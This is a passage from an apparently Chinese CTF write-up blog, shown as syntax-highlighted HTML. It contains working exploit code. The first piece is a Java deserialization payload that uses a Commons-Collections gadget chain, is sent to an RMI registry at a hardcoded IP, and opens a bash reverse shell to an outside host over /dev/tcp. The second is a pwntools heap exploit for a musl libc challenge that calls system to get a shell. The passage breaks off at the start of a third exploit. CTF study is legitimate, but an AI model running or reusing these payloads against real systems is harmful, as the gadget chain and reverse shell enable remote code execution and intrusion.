</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.rmb122.test</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>services.MarkDown</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.rmi.server.UnicastRef</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.rmi.transport.LiveRef</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.rmi.transport.tcp.TCPEndpoint</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.management.BadAttributeValueExpException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Proxy</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.URL</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.URLConnection</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.rmi.Naming</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.rmi.registry.LocateRegistry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.rmi.registry.Registry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.rmi.server.ObjID</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.rmi.server.RemoteObjectInvocationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Random</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>Main</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>,</span><span class=s>&#34;-c&#34;</span><span class=w> </span><span class=p>,</span><span class=w> </span><span class=s>&#34;bash -i &gt;&amp; /dev/tcp/111.111.111.111/19132 0&gt;&amp;1&#34;</span><span class=p>}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=n>chainedTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>lazyMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>hashMap</span><span class=p>,</span><span class=w> </span><span class=n>chainedTransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TiedMapEntry</span><span class=w> </span><span class=n>tiedMapEntry</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>lazyMap</span><span class=p>,</span><span class=w> </span><span class=s>&#34;placeholder&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BadAttributeValueExpException</span><span class=w> </span><span class=n>badAttributeValueExpException</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BadAttributeValueExpException</span><span class=p>(</span><span class=s>&#34;placeholder&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>badAttributeValueExpException</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;val&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>badAttributeValueExpException</span><span class=p>,</span><span class=w> </span><span class=n>tiedMapEntry</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Registry</span><span class=w> </span><span class=n>r</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LocateRegistry</span><span class=p>.</span><span class=na>getRegistry</span><span class=p>(</span><span class=w> </span><span class=s>&#34;121.36.222.22&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2078</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>MarkDown</span><span class=w> </span><span class=n>markDown</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>MarkDown</span><span class=p>)</span><span class=w> </span><span class=n>r</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=s>&#34;markdown&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>markDown</span><span class=p>.</span><span class=na>parseDocument</span><span class=p>(</span><span class=n>badAttributeValueExpException</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=pwn>Pwn</h2><h3 id=musl>musl</h3><p>迷你libc，堆块合并时有类似ptmalloc的unlink</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;119.3.158.103&#34;</span><span class=p>,</span><span class=mi>19008</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>se</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sea</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rc</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rn</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shell</span> <span class=o>=</span> <span class=k>lambda</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>aBinsh</span> <span class=o>=</span> <span class=mh>0x91345</span>
</span></span><span class=line><span class=cl><span class=n>overflow</span> <span class=o>=</span> <span class=s2>&#34;L&#34;</span><span class=o>*</span><span class=mh>0x50</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xbadbeef</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x70</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x81</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;ldddddhm&#34;</span>
</span></span><span class=line><span class=cl><span class=n>prdi</span> <span class=o>=</span> <span class=mh>0x14862</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>YorN</span><span class=p>,</span> <span class=n>Content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span><span class=s2>&#34;1&#34;</span><span class=p>);</span><span class=n>sla</span><span class=p>(</span><span class=s2>&#34; &gt;&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>));</span><span class=n>sla</span><span class=p>(</span><span class=s2>&#34; &gt;&#34;</span><span class=p>,</span><span class=n>YorN</span><span class=p>);</span><span class=n>sa</span><span class=p>(</span><span class=s2>&#34; &gt;&#34;</span><span class=p>,</span><span class=n>Content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>Index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span><span class=s2>&#34;2&#34;</span><span class=p>);</span><span class=n>sla</span><span class=p>(</span><span class=s2>&#34; &gt;&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>Index</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>transform</span><span class=p>(</span><span class=n>Index</span><span class=p>,</span> <span class=n>Content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span><span class=s2>&#34;3&#34;</span><span class=p>);</span><span class=n>sla</span><span class=p>(</span><span class=s2>&#34; &gt;&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>Index</span><span class=p>));</span><span class=n>se</span><span class=p>(</span><span class=n>Content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>examine</span><span class=p>(</span><span class=n>Index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span><span class=s2>&#34;4&#34;</span><span class=p>);</span><span class=n>sla</span><span class=p>(</span><span class=s2>&#34; &gt;&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>Index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ru</span><span class=p>(</span><span class=s2>&#34;e</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=s2>&#34;N&#34;</span><span class=p>,</span><span class=s2>&#34;LuDuiNiuBi</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=p>[</span><span class=mi>3</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>1</span><span class=p>]]</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x38</span><span class=p>,</span><span class=s2>&#34;Y&#34;</span><span class=p>,</span><span class=n>overflow</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>examine</span><span class=p>(</span><span class=mi>4</span><span class=p>)[</span><span class=mi>8</span><span class=p>:</span><span class=mi>14</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x292e38</span>
</span></span><span class=line><span class=cl><span class=n>transform</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x71</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x290000</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x290008</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>transform</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x290010</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x4</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x602034</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x294fd8</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>transform</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>retInStack</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>examine</span><span class=p>(</span><span class=mi>2</span><span class=p>)[:</span><span class=mi>6</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x90</span>
</span></span><span class=line><span class=cl><span class=n>transform</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x70</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>retInStack</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>transform</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>prdi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>aBinsh</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>])</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shell</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=easyheap>easyheap</h3><p>add函数中即使size不对也会先分配一个Item对象再返回进行分配,也就是可以使fastbin的fd指针落到原来的chunk指针的位置前，就可以利用edit任意写.</p><p>先劫持free@got为puts@plt泄露libc，然后劫持为system从而getshell。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span> <span class=n>cont</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;e?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;e?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>cont</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ed?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>cont</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;ce:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
